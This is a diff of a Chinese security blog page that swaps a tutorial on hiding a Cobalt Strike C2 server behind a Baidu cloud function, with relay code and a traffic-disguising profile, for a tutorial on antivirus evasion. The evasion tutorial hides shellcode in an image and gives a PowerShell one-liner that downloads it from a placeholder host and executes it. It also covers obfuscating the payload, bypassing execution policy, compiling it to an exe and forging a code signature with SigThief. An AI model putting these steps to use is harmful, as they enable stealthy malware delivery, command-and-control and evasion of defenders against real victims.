@@ -19,31 +19,23 @@
   <meta name="author" content="Sunean">
   <meta name="keywords" content="">
   
-    <meta name="description" content="在护网中，c2服务器对红队师傅来说至关重要，但是在攻防过程中c2服务器难免与目标直接交互留下痕迹。这里我们通过云函数来避免vps地址被蓝队溯源 1、注册进入百度云搜索云函数创建函数，编辑好必要信息之后点下一步  运行时环境此处必须选择python3.6，否则后面的脚本无法运行  2、进入代码编辑页 将代码贴上特别注意在C2变量中需要填写自己vps的信息，建议使用http协议，以及自定义端口，如有特">
+    <meta name="description" content="利用powershell加载shellcode实现木马免杀 1、将shellcode写入图片工具：Invoke-PSImage-master https:&#x2F;&#x2F;github.com&#x2F;peewpw&#x2F;Invoke-PSImage 123456Set-ExecutionPolicy Unrestricted -Scope CurrentUser&#x2F;&#x2F;设置执行策略Import-Module .\Invoke-">
 <meta property="og:type" content="article">
-<meta property="og:title" content="百度云函数实现c2服务器地址隐藏">
-<meta property="og:url" content="http://example.com/2025/08/22/%E7%99%BE%E5%BA%A6%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/index.html">
+<meta property="og:title" content="Powershell免杀学习">
+<meta property="og:url" content="http://example.com/2025/08/22/ps%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Sunean">
-<meta property="og:description" content="在护网中，c2服务器对红队师傅来说至关重要，但是在攻防过程中c2服务器难免与目标直接交互留下痕迹。这里我们通过云函数来避免vps地址被蓝队溯源 1、注册进入百度云搜索云函数创建函数，编辑好必要信息之后点下一步  运行时环境此处必须选择python3.6，否则后面的脚本无法运行  2、进入代码编辑页 将代码贴上特别注意在C2变量中需要填写自己vps的信息，建议使用http协议，以及自定义端口，如有特">
+<meta property="og:description" content="利用powershell加载shellcode实现木马免杀 1、将shellcode写入图片工具：Invoke-PSImage-master https:&#x2F;&#x2F;github.com&#x2F;peewpw&#x2F;Invoke-PSImage 123456Set-ExecutionPolicy Unrestricted -Scope CurrentUser&#x2F;&#x2F;设置执行策略Import-Module .\Invoke-">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603110740297.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111022560.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111411146.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111509971.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111921985.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112007172.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112313063.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112604714.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112846828.png">
-<meta property="article:published_time" content="2025-08-22T03:02:49.566Z">
-<meta property="article:modified_time" content="2025-08-22T03:21:34.393Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250529145416449.png">
+<meta property="article:published_time" content="2025-08-22T03:32:59.819Z">
+<meta property="article:modified_time" content="2025-08-22T03:37:53.122Z">
 <meta property="article:author" content="Sunean">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603110740297.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250529145416449.png">
   
   
   
-  <title>百度云函数实现c2服务器地址隐藏 - Sunean</title>
+  <title>Powershell免杀学习 - Sunean</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -209,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="百度云函数实现c2服务器地址隐藏"></span>
+            <span id="subtitle" data-typed-text="Powershell免杀学习"></span>
           
         </div>
 
@@ -220,7 +212,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-08-22 11:02" pubdate>
+        <time datetime="2025-08-22 11:32" pubdate>
           August 22, 2025 am
         </time>
       </span>
@@ -232,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          488 words
+          397 words
         
       </span>
     
@@ -243,7 +235,7 @@
         
         
         
-          5 mins
+          4 mins
         
       </span>
     
@@ -280,35 +272,45 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">百度云函数实现c2服务器地址隐藏</h1>
+            <h1 id="seo-header">Powershell免杀学习</h1>
             
             
               <div class="markdown-body">
                 
-                <p>在护网中，c2服务器对红队师傅来说至关重要，但是在攻防过程中c2服务器难免与目标直接交互留下痕迹。这里我们通过云函数来避免vps地址被蓝队溯源</p>
-<h2 id="1、注册进入百度云搜索云函数"><a href="#1、注册进入百度云搜索云函数" class="headerlink" title="1、注册进入百度云搜索云函数"></a>1、注册进入百度云搜索云函数</h2><p>创建函数，编辑好必要信息之后点下一步</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603110740297.png" srcset="/img/loading.gif" lazyload alt="image-20250603110740297"></p>
-<p>运行时环境此处必须选择python3.6，否则后面的脚本无法运行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111022560.png" srcset="/img/loading.gif" lazyload alt="image-20250603111022560"></p>
-<h2 id="2、进入代码编辑页"><a href="#2、进入代码编辑页" class="headerlink" title="2、进入代码编辑页"></a>2、进入代码编辑页</h2><p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111411146.png" srcset="/img/loading.gif" lazyload alt="image-20250603111411146"></p>
-<p>将代码贴上特别注意在C2变量中需要填写自己vps的信息，建议使用http协议，以及自定义端口，如有特别需求也可以更改编码方式</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br> <br><span class="hljs-comment"># def handler(event, context): </span><br><span class="hljs-comment">#     return &quot;Hello World&quot;</span><br>import json,requests,base64<br>def handler(event, context):<br>    <span class="hljs-attribute">C2</span>=<span class="hljs-string">&#x27;https://xxxx:443&#x27;</span># 这里可以使用 HTTP、HTTPS~下角标~   <br>    <span class="hljs-attribute">path</span>=event[<span class="hljs-string">&#x27;path&#x27;</span>]<br>    <span class="hljs-attribute">headers</span>=event[<span class="hljs-string">&#x27;headers&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(event)<br>    <span class="hljs-keyword">if</span> event[<span class="hljs-string">&#x27;httpMethod&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span> :<br>        <span class="hljs-attribute">resp</span>=requests.get(C2+path,headers=headers,verify=False)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-attribute">resp</span>=requests.post(C2+path,data=event[<span class="hljs-string">&#x27;body&#x27;</span>],<span class="hljs-attribute">headers</span>=headers,verify=False)<br>    <span class="hljs-built_in">print</span>(resp.headers)<br>    <span class="hljs-built_in">print</span>(resp.content)<br>    response=&#123;<br>    <span class="hljs-string">&quot;isBase64Encoded&quot;</span>: <span class="hljs-literal">True</span>,<br>    <span class="hljs-string">&quot;statusCode&quot;</span>: resp.status_code,<br>    <span class="hljs-string">&quot;headers&quot;</span>: dict(resp.headers),<br>    <span class="hljs-string">&quot;body&quot;</span>: str(base64.b64encode(resp.content))[2:-1]<br>    &#125;<br>    #return event<br>    return response<br></code></pre></td></tr></table></figure>
+                <p>利用powershell加载shellcode实现木马免杀</p>
+<h2 id="1、将shellcode写入图片"><a href="#1、将shellcode写入图片" class="headerlink" title="1、将shellcode写入图片"></a>1、将shellcode写入图片</h2><p>工具：Invoke-PSImage-master</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Set-ExecutionPolicy Unrestricted -Scope CurrentUser<br><span class="hljs-comment">//设置执行策略</span><br>Import-Module .\Invoke-PSImage<span class="hljs-selector-class">.ps1</span><br><span class="hljs-comment">//导入目标脚本文件</span><br>Invoke-PSImage -Script .\payload<span class="hljs-selector-class">.ps1</span> -Image .\<span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.png</span> -Out .\payload<span class="hljs-selector-class">.jpg</span> -Web <br><span class="hljs-comment">//payload.ps1原生shellcode。img.png是有普通图片。payload.jpg是生成的带有shellcode的图片</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111509971.png" srcset="/img/loading.gif" lazyload alt="image-20250603111509971"></p>
-<h2 id="3、新增触发器"><a href="#3、新增触发器" class="headerlink" title="3、新增触发器"></a>3、新增触发器</h2><p>选择http触发器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603111921985.png" srcset="/img/loading.gif" lazyload alt="image-20250603111921985"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112007172.png" srcset="/img/loading.gif" lazyload alt="image-20250603112007172"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112313063.png" srcset="/img/loading.gif" lazyload alt="image-20250603112313063"></p>
-<p>云函数生成的随机域名</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112604714.png" srcset="/img/loading.gif" lazyload alt="image-20250603112604714"></p>
-<h2 id="4、编写cs配置文件"><a href="#4、编写cs配置文件" class="headerlink" title="4、编写cs配置文件"></a>4、编写cs配置文件</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http-get &#123;<br> <br>  set uri <span class="hljs-string">&quot;/api/x&quot;</span><span class="hljs-comment">;</span><br> <br>  client &#123;<br>      header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;*/*&quot;</span><span class="hljs-comment">;</span><br>      metadata &#123;<br>          base64<span class="hljs-comment">;</span><br>          prepend <span class="hljs-string">&quot;SESSIONID=&quot;</span><span class="hljs-comment">;</span><br>          header <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br> <br>  server &#123;<br>      header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/ocsp-response&quot;</span><span class="hljs-comment">;</span><br>      header <span class="hljs-string">&quot;content-transfer-encoding&quot;</span> <span class="hljs-string">&quot;binary&quot;</span><span class="hljs-comment">;</span><br>      header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Nodejs&quot;</span><span class="hljs-comment">;</span><br>      output &#123;<br>          base64<span class="hljs-comment">;</span><br>          print<span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br>&#125;<br>http-stager &#123;<br>  set uri_x86 <span class="hljs-string">&quot;/vue.min.js&quot;</span><span class="hljs-comment">;</span><br>  set uri_x64 <span class="hljs-string">&quot;/bootstrap-2.min.js&quot;</span><span class="hljs-comment">;</span><br>&#125;<br>http-post &#123;<br>  set uri <span class="hljs-string">&quot;/api/y&quot;</span><span class="hljs-comment">;</span><br>  client &#123;<br>      header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;*/*&quot;</span><span class="hljs-comment">;</span><br>      id &#123;<br>          base64<span class="hljs-comment">;</span><br>          prepend <span class="hljs-string">&quot;JSESSION=&quot;</span><span class="hljs-comment">;</span><br>          header <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-comment">;</span><br>      &#125;<br>      output &#123;<br>          base64<span class="hljs-comment">;</span><br>          print<span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br> <br>  server &#123;<br>      header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/ocsp-response&quot;</span><span class="hljs-comment">;</span><br>      header <span class="hljs-string">&quot;content-transfer-encoding&quot;</span> <span class="hljs-string">&quot;binary&quot;</span><span class="hljs-comment">;</span><br>      header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;keep-alive&quot;</span><span class="hljs-comment">;</span><br>      output &#123;<br>          base64<span class="hljs-comment">;</span><br>          print<span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250529145416449.png" srcset="/img/loading.gif" lazyload alt="image-20250529145416449"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sal</span> a <span class="hljs-built_in">New-Object</span>;<span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-A</span> System.Drawing;<span class="hljs-variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="hljs-string">&quot;http://example.com/test2.png&quot;</span>));<span class="hljs-variable">$o</span>=a Byte[] <span class="hljs-number">3600</span>;(<span class="hljs-number">0</span>..<span class="hljs-number">19</span>)|%&#123;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$x</span> <span class="hljs-keyword">in</span>(<span class="hljs-number">0</span>..<span class="hljs-number">179</span>))&#123;<span class="hljs-variable">$p</span>=<span class="hljs-variable">$g</span>.GetPixel(<span class="hljs-variable">$x</span>,<span class="hljs-variable">$_</span>);<span class="hljs-variable">$o</span>[<span class="hljs-variable">$_</span>*<span class="hljs-number">180</span>+<span class="hljs-variable">$x</span>]=([<span class="hljs-type">math</span>]::Floor((<span class="hljs-variable">$p</span>.B<span class="hljs-literal">-band15</span>)*<span class="hljs-number">16</span>)<span class="hljs-operator">-bor</span>(<span class="hljs-variable">$p</span>.G <span class="hljs-operator">-band</span> <span class="hljs-number">15</span>))&#125;&#125;;<span class="hljs-built_in">IEX</span>([<span class="hljs-type">System.Text.Encoding</span>]::ASCII.GetString(<span class="hljs-variable">$o</span>[<span class="hljs-number">0</span><span class="hljs-type">..3554</span>]))<br><br>//生成执行命令，将payload.jpg放入vps，然后将图片地址替换执行命令中的<span class="hljs-string">&quot;http://example.com/test2.png&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>保存为baidu.profile</p>
-<p>cs启动命令为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./teamserver vps <span class="hljs-built_in">pwd</span> baidu.profile<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Suneanist/tuchuang@main/img/image-20250603112846828.png" srcset="/img/loading.gif" lazyload alt="image-20250603112846828"></p>
-<p>添加监听器准备上线！</p>
+
+<h2 id="2、加密执行命令"><a href="#2、加密执行命令" class="headerlink" title="2、加密执行命令"></a>2、加密执行命令</h2><p>使用Invoke-Obfuscation-master进行加密</p>
+<h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/danielbohannon/</span>Invoke-Obfuscation<br></code></pre></td></tr></table></figure>
+
+<p>进入Invoke-Obfuscation-master目录后使用ps执行</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">set-ExecutionPolicy</span> <span class="hljs-string">RemoteSigned</span><br><span class="hljs-string">Y</span><br>//报错就执行上述命令， 管理员权限<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1; <span class="hljs-built_in">Invoke-Obfuscation</span><br><span class="hljs-built_in">set</span> scriptpath payload.ps1    //执行指定待处理的Ps1文件<br></code></pre></td></tr></table></figure>
+
+<p>选择操作类型：比如选择加密，此工具的优势就是可以进行多次加密叠加</p>
+<p>输出加密后的文件：out+path+filename</p>
+<p>例如：D:\Invoke-Obfuscation-master\ps\shell.ps1</p>
+<h3 id="靶机执行"><a href="#靶机执行" class="headerlink" title="靶机执行"></a>靶机执行</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">powershell.exe -ExecutionPolicy Bypass -NoExit -<span class="hljs-keyword">File</span> <span class="hljs-keyword">shell</span>.ps1<br></code></pre></td></tr></table></figure>
+
+<p>将ps1打包成exe</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Install-Module ps2exe   <span class="hljs-comment">//在powershell执行命令，注意要是管理员权限</span><br>Invoke-ps2exe .\<span class="hljs-selector-tag">source</span><span class="hljs-selector-class">.ps1</span> .\target<span class="hljs-selector-class">.exe</span>    <span class="hljs-comment">//将ps1文件编译成exe</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="3、加入数字签名"><a href="#3、加入数字签名" class="headerlink" title="3、加入数字签名"></a>3、加入数字签名</h2><p>工具：SigThief-master</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sigthief.<span class="hljs-keyword">py</span> -i msedge.<span class="hljs-keyword">exe</span> -t payload.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">o</span> test.<span class="hljs-keyword">exe</span><br>// msedge.<span class="hljs-keyword">exe</span>是含有数字签名的程序，payload.<span class="hljs-keyword">exe</span>是需要数字签名程序，test.<span class="hljs-keyword">exe</span>是输出的含有数字签名的程序<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -326,8 +328,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>百度云函数实现c2服务器地址隐藏</div>
-      <div>http://example.com/2025/08/22/百度云函数配置/</div>
+      <div>Powershell免杀学习</div>
+      <div>http://example.com/2025/08/22/ps免杀学习/</div>
     </div>
     <div class="license-meta">
       
@@ -371,18 +373,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/08/22/ps%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/" title="Powershell免杀学习">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Powershell免杀学习</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/08/22/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/2025/08/22/%E7%99%BE%E5%BA%A6%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/" title="百度云函数实现c2服务器地址隐藏">
+                        <span class="hidden-mobile">百度云函数实现c2服务器地址隐藏</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
